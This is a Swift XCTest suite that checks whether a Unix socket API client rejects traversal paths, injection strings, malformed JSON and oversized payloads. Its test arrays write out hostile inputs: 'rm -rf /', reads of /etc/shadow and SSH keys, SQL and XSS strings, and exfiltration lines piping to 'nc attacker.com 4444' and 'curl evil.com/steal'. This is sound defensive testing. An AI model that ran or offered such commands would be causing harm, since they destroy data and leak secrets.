// SecurityTests.swift
// Comprehensive security and attack prevention tests

import XCTest
@testable import SwiftUnixSockAPI

@MainActor
final class SecurityTests: XCTestCase {
    
    var testSocketPath: String!
    var testAPISpec: APISpecification!
    
    override func setUpWithError() throws {
        testSocketPath = "/tmp/unixsockapi-security-test.sock"
        
        // Clean up any existing test socket files
        try? FileManager.default.removeItem(atPath: testSocketPath)
        
        // Create test API specification
        let argSpec = ArgumentSpec(
            type: .string,
            required: true,
            validation: ValidationSpec(maxLength: 1000)
        )
        
        let commandSpec = CommandSpec(
            description: "Test command",
            args: ["data": argSpec],
            response: ResponseSpec(type: .object)
        )
        
        let channelSpec = ChannelSpec(
            description: "Test channel",
            commands: ["testCommand": commandSpec]
        )
        
        testAPISpec = APISpecification(
            version: "1.0.0",
            channels: ["testChannel": channelSpec]
        )
    }
    
    override func tearDownWithError() throws {
        // Clean up test socket files
        try? FileManager.default.removeItem(atPath: testSocketPath)
    }
    
    // MARK: - Path Traversal Attack Tests
    
    func testPathTraversalAttack() {
        let maliciousPaths = [
            "/tmp/../etc/passwd",
            "/tmp/../../usr/bin/sh",
            "/tmp/../../../root/.ssh/id_rsa",
            "/var/run/../../etc/shadow",
            "/var/tmp/../../../proc/version",
            "/tmp/../../../../dev/null",
            "/tmp/../../../../../../../../../../etc/passwd",
            "/../../../etc/passwd",
            "/tmp/./../../etc/passwd",
            "/tmp/./../../../etc/passwd"
        ]
        
        for maliciousPath in maliciousPaths {
            XCTAssertThrowsError(
                try UnixSockAPIClient(
                    socketPath: maliciousPath,
                    channelId: "testChannel",
                    apiSpec: testAPISpec
                ),
                "Path traversal attack should be blocked: \(maliciousPath)"
            ) { error in
                XCTAssertTrue(error is UnixSockAPIError)
                if case .invalidSocketPath(let message) = error as? UnixSockAPIError {
                    XCTAssertTrue(message.contains("traversal") || message.contains("invalid"))
                }
            }
        }
    }
    
    func testInvalidSocketPathCharacters() {
        // Test null byte injection - this should be rejected
        let nullBytePaths = [
            "/tmp/socket\0path",           // Null byte
        ]
        
        for invalidPath in nullBytePaths {
            XCTAssertThrowsError(
                try UnixSockAPIClient(
                    socketPath: invalidPath,
                    channelId: "testChannel",
                    apiSpec: testAPISpec
                ),
                "Null byte in path should be rejected: \(invalidPath.debugDescription)"
            )
        }
        
        // Other characters like tab, newline, etc. may be valid in Unix paths
        // The primary security concern is null byte injection which is tested above
    }
    
    func testSocketPathLengthLimits() {
        // Unix socket paths have a maximum length (typically 108 characters on most systems)
        let longPath = "/tmp/" + String(repeating: "a", count: 200) + ".sock"
        
        // This might throw due to system limits rather than our validation
        // The important thing is that it doesn't crash or cause undefined behavior
        do {
            _ = try UnixSockAPIClient(
                socketPath: longPath,
                channelId: "testChannel",
                apiSpec: testAPISpec
            )
        } catch {
            // Expected to fail due to system limitations
            XCTAssertTrue(error is UnixSockAPIError)
        }
    }
    
    // MARK: - Input Injection Attack Tests
    
    func testChannelIdInjectionAttacks() {
        let maliciousChannelIds = [
            "channel'; DROP TABLE users; --",    // SQL injection attempt
            "channel$(rm -rf /)",                // Command injection attempt
            "channel`rm -rf /`",                 // Command injection with backticks
            "channel\"; cat /etc/passwd; \"",    // Shell injection
            "channel\0admin",                    // Null byte injection
            "channel\n\rEXIT",                   // Line termination injection
            "<script>alert('xss')</script>",     // XSS attempt
            "../../../etc/passwd",               // Path traversal in channel ID
            "channel\u{1F}\u{7F}\u{00}",        // Control characters
            String(repeating: "a", count: 10000) // Extremely long input
        ]
        
        for maliciousId in maliciousChannelIds {
            XCTAssertThrowsError(
                try UnixSockAPIClient(
                    socketPath: testSocketPath,
                    channelId: maliciousId,
                    apiSpec: testAPISpec
                ),
                "Malicious channel ID should be rejected: \(maliciousId.debugDescription)"
            ) { error in
                XCTAssertTrue(error is UnixSockAPIError, "Expected UnixSockAPIError but got \(error)")
            }
        }
    }
    
    func testCommandInjectionInArguments() async throws {
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel",
            apiSpec: testAPISpec
        )
        
        let maliciousArguments = [
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "| nc attacker.com 4444",
            "&& curl evil.com/steal",
            "\"; cat /etc/shadow; \"",
            "\0admin",
            "../../../etc/passwd",
            String(repeating: "A", count: 100000) // Memory exhaustion attempt
        ]
        
        for maliciousArg in maliciousArguments {
            do {
                _ = try await client.publishCommand(
                    "testCommand",
                    args: ["data": AnyCodable(maliciousArg)]
                )
                // If no connection error, the validation should still work
            } catch UnixSocketError.connectionFailed, UnixSocketError.notConnected {
                // Expected - no server running, but validation passed
            } catch let error as UnixSockAPIError {
                // Should not get validation errors for string content
                // (unless it exceeds length limits)
                if case .invalidArguments = error {
                    // Only acceptable if it's due to length limits
                    XCTAssertTrue(maliciousArg.count > 1000, "Only very long strings should be rejected")
                }
            } catch {
                XCTFail("Unexpected error for malicious argument '\(maliciousArg)': \(error)")
            }
        }
    }
    
    // MARK: - JSON/Protocol Attack Tests
    
    func testMalformedJSONAttacks() throws {
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel", 
            apiSpec: testAPISpec
        )
        
        // Test that the client's message validation works properly
        // We can't easily inject malformed JSON through the normal API,
        // but we can test the underlying validation logic
        
        let definitivelyInvalidJSON = [
            "{ \"incomplete\": ",                    // Incomplete JSON
            "[ \"arrays\", \"should\", \"not\", \"be\", \"root\" ]",  // Arrays as root (not allowed by validation that expects objects)
            "\"primitive string\"",                  // String primitive (not object)
            "42",                                    // Number primitive (not object)
            "true",                                  // Boolean primitive (not object)
            "null",                                  // Null primitive (not object)
            "{ \"nullbytes\": \"data\0here\" }"     // Null bytes should be rejected
        ]
        
        // These should definitely be caught by validation
        for jsonString in definitivelyInvalidJSON {
            let data = jsonString.data(using: .utf8)!
            
            // Test if our message validation catches these
            let socketClient = UnixSocketClient(socketPath: testSocketPath)
            let isValid = socketClient.isValidMessageData(data)
            
            XCTAssertFalse(isValid, "Malformed JSON should be rejected: \(jsonString)")
        }
        
        // Test a valid object structure that should pass
        let validJSON = "{ \"valid\": \"object\" }"
        let validData = validJSON.data(using: .utf8)!
        let socketClient = UnixSocketClient(socketPath: testSocketPath)
        XCTAssertTrue(socketClient.isValidMessageData(validData), "Valid JSON object should be accepted")
    }
    
    func testUnicodeNormalizationAttacks() async throws {
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel",
            apiSpec: testAPISpec
        )
        
        // Unicode normalization attacks
        let unicodeAttacks = [
            "admin\u{0130}",           // Turkish capital I with dot
            "Admin\u{212A}",          // Kelvin sign (looks like K)
            "\u{FEFF}admin",          // Zero-width no-break space
            "admin\u{200E}",          // Left-to-right mark
            "\u{2000}admin",          // En quad space
            "a\u{0300}dmin",          // Combining grave accent
            "admin\u{034F}",          // Combining grapheme joiner
        ]
        
        for unicodeAttack in unicodeAttacks {
            do {
                _ = try await client.publishCommand(
                    "testCommand",
                    args: ["data": AnyCodable(unicodeAttack)]
                )
            } catch UnixSocketError.connectionFailed, UnixSocketError.notConnected {
                // Expected - no server running
            } catch {
                // Unicode content should be handled gracefully
                // Only fail if there's actual validation logic that should catch this
            }
        }
    }
    
    // MARK: - Memory Exhaustion Attack Tests
    
    func testLargePayloadAttacks() async throws {
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel",
            apiSpec: testAPISpec
        )
        
        // Test various large payload sizes
        let largeSizes = [
            1024 * 1024,        // 1MB
            5 * 1024 * 1024,    // 5MB (should hit our limit)
            10 * 1024 * 1024,   // 10MB 
            50 * 1024 * 1024    // 50MB (should definitely be rejected)
        ]
        
        for size in largeSizes {
            let largeData = String(repeating: "A", count: size)
            
            do {
                _ = try await client.publishCommand(
                    "testCommand",
                    args: ["data": AnyCodable(largeData)]
                )
            } catch UnixSocketError.connectionFailed, UnixSocketError.notConnected {
                // Expected - no server running
            } catch let error as UnixSockAPIError {
                if case .invalidArguments(let message) = error {
                    XCTAssertTrue(message.contains("size") || message.contains("large"),
                                "Large payload should be rejected with size error: \(message)")
                }
            } catch UnixSocketError.messageToLarge {
                // This is also acceptable - message size limit reached
            } catch {
                XCTFail("Unexpected error for large payload (size: \(size)): \(error)")
            }
        }
    }
    
    func testRepeatedLargePayloadAttacks() async throws {
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel",
            apiSpec: testAPISpec
        )
        
        // Test rapid repeated large payloads (DoS attempt)
        let mediumData = String(repeating: "B", count: 100000) // 100KB
        
        for i in 0..<10 {
            do {
                _ = try await client.publishCommand(
                    "testCommand",
                    args: ["data": AnyCodable(mediumData), "index": AnyCodable(i)]
                )
            } catch UnixSocketError.connectionFailed, UnixSocketError.notConnected {
                // Expected - no server running
            } catch {
                // Should handle repeated requests gracefully
            }
        }
    }
    
    // MARK: - Resource Exhaustion Tests
    
    func testConnectionPoolExhaustion() async throws {
        let config = UnixSockAPIClientConfig(maxConcurrentConnections: 5) // Small limit for testing
        
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel", 
            apiSpec: testAPISpec,
            config: config
        )
        
        // Try to exhaust the connection pool
        await withTaskGroup(of: Void.self) { group in
            for i in 0..<20 { // More than the limit
                group.addTask {
                    do {
                        _ = try await client.publishCommand(
                            "testCommand",
                            args: ["data": AnyCodable("test\(i)")]
                        )
                    } catch {
                        // Expected to fail due to connection limits or no server
                    }
                }
            }
        }
        
        // Should not crash or hang, even under resource pressure
    }
    
    func testRapidConnectionAttempts() async throws {
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel",
            apiSpec: testAPISpec
        )
        
        // Rapid connection attempts (potential DoS)
        await withTaskGroup(of: Void.self) { group in
            for i in 0..<100 {
                group.addTask {
                    do {
                        _ = try await client.publishCommand(
                            "testCommand",
                            args: ["data": AnyCodable("rapid\(i)")]
                        )
                    } catch {
                        // Expected to fail, but should not crash
                    }
                }
            }
        }
    }
    
    // MARK: - Configuration Security Tests
    
    func testInsecureConfigurationPrevention() throws {
        // Test that the library can be configured with reasonable defaults
        let defaultConfig = UnixSockAPIClientConfig.default
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel",
            apiSpec: testAPISpec,
            config: defaultConfig
        )
        
        // Verify default configuration has reasonable security values
        XCTAssertGreaterThan(client.configuration.maxConcurrentConnections, 0)
        XCTAssertGreaterThan(client.configuration.maxMessageSize, 0)
        XCTAssertGreaterThan(client.configuration.connectionTimeout, 0)
        XCTAssertGreaterThan(client.configuration.maxPendingCommands, 0)
        XCTAssertGreaterThan(client.configuration.maxCommandHandlers, 0)
        XCTAssertGreaterThan(client.configuration.maxChannelNameLength, 0)
        XCTAssertGreaterThan(client.configuration.maxCommandNameLength, 0)
        XCTAssertGreaterThan(client.configuration.maxArgsDataSize, 0)
    }
    
    func testExtremeConfigurationValues() {
        // Test extreme but potentially valid configuration values
        let extremeConfig = UnixSockAPIClientConfig(
            maxConcurrentConnections: Int.max,
            maxMessageSize: Int.max,
            connectionTimeout: TimeInterval.greatestFiniteMagnitude,
            maxPendingCommands: Int.max,
            maxCommandHandlers: Int.max,
            maxChannelNameLength: Int.max,
            maxCommandNameLength: Int.max,
            maxArgsDataSize: Int.max
        )
        
        // Should either reject or sanitize to reasonable values
        do {
            _ = try UnixSockAPIClient(
                socketPath: testSocketPath,
                channelId: "testChannel",
                apiSpec: testAPISpec,
                config: extremeConfig
            )
            // If accepted, it should work without causing issues
        } catch {
            // It's also reasonable to reject extreme values
        }
    }
    
    // MARK: - Validation Bypass Tests
    
    func testValidationBypassAttempts() throws {
        // Test attempts to bypass argument validation
        let client = try UnixSockAPIClient(
            socketPath: testSocketPath,
            channelId: "testChannel",
            apiSpec: testAPISpec
        )
        
        // Try to register handlers for non-existent commands
        XCTAssertThrowsError(
            try client.registerCommandHandler("nonExistentCommand") { _, _ in
                return ["result": AnyCodable("bypass")]
            }
        ) { error in
            XCTAssertTrue(error is UnixSockAPIError)
        }
        
        // Try to register too many handlers
        do {
            for i in 0..<1000 {
                try client.registerCommandHandler("testCommand") { _, _ in
                    return ["result": AnyCodable("handler\(i)")]
                }
            }
        } catch let error as UnixSockAPIError {
            // Should eventually hit handler limits
            if case .tooManyHandlers = error {
                // Expected
            } else {
                XCTFail("Expected tooManyHandlers error, got: \(error)")
            }
        }
    }
}